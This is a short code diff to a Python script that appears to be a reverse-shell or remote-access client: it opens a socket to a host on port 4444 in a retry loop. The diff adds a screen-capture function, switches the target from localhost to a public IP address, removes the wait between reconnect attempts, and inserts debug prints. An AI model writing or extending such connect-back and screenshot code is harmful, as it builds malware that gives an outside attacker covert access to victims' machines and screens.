@@ -1,6 +1,10 @@
 import socket, os, sys, subprocess
 from time import sleep
-sHost = "localhost"
+import autopy
+def screenshot():
+    bitmap = autopy.bitmap.capture_screen()
+    return bitmap
+sHost = "86.201.13.200"
 sPort = 4444
 bufferSize = 1024 * 128
 separator = " "
@@ -8,11 +12,18 @@ isntConnected = True
 s = socket.socket()
 while isntConnected:
     try:
+        print("1")
         s.connect((sHost, sPort))
+
+        print("2")
         isntConnected = False
+        print("3")
     except:
+        print("4")
         continue
-    sleep(5)
+        print("5")
+
+    print(6)
 
 
 
